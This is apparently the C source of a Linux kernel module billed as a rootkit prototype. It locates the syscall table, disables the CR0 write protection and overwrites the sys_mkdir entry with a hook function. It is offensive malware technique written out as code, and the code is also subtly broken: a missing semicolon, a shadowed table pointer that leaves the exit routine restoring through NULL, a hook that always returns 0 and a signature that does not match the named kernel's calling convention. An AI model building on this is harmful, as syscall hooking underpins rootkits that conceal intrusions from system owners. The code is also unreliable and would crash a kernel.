// ROOTKITS, ROOTKITS EVERYWHERE w00t w00t

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/proc_ns.h>
#include <linux/version.h>  

/* SYSCALL TABLE DEFINITION

void *sys_call_table[NR_syscalls] = {
	[0 ... NR_syscalls-1] = sys_ni_syscall,
#include <asm/unistd.h>
};

*/

// Linux debian 4.19.0-16-amd64

MODULE_DESCRIPTION("LKM Syscall Hook Prototype");
MODULE_LICENSE("Dual BSD/GPL"); // Necessary for "kallsyms_lookup_name()"

unsigned long cr0;
unsigned long *syscall_table;

asmlinkage long (*orig_mkdir)(const char*, umode_t);

unsigned long* findSyscallTable(void) {
	
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)

	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return syscall_table;

#endif

    return NULL;

}

static inline void writeCr0(unsigned long val) {

	unsigned long __force_order;

	asm volatile(

		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order)
        
    );

}

static inline void unprotectMemory(void) {

    writeCr0(cr0 & ~0x00010000);

}

static inline void protectMemory(void) {

    writeCr0(cr0);

}

asmlinkage long mkdir_hook(const char *ebx, umode_t ecx) {

    int result = (*orig_mkdir)(ebx, ecx);

    if (result == 0)  {
        printk(KERN_INFO "[!] MKDIR HOOK WORKS \n", syscall_table);
    }

    return 0;

}

static int __init lkmInit(void) {

    unsigned long *syscall_table;

    syscall_table = findSyscallTable();
    if (!syscall_table){
        printk(KERN_INFO "[-] KERNEL NOT SUPPORTED :(")
		return -1;
    }

    printk(KERN_INFO "[+] Syscall table address: 0x%p \n", syscall_table);

    cr0 = read_cr0();

    unprotectMemory();

    orig_mkdir = (void*)syscall_table[__NR_mkdir];

    printk(KERN_INFO "[+] Original sys_mkdir: 0x%x", orig_mkdir);

    syscall_table[__NR_mkdir] = mkdir_hook;

    protectMemory();

    printk(KERN_INFO "[+] Hook Function Addr: 0x%x", mkdir_hook);
    printk(KERN_INFO "[+] New overwrite sys_mkdir Addr: 0x%x", syscall_table[__NR_mkdir]);

    return 0;

}

static void __exit lkmExit(void) {

    unprotectMemory();

    syscall_table[__NR_mkdir] = orig_mkdir;

    protectMemory();

    printk("Good Bye Kernel ;) \n");

}


module_init(lkmInit);
module_exit(lkmExit);
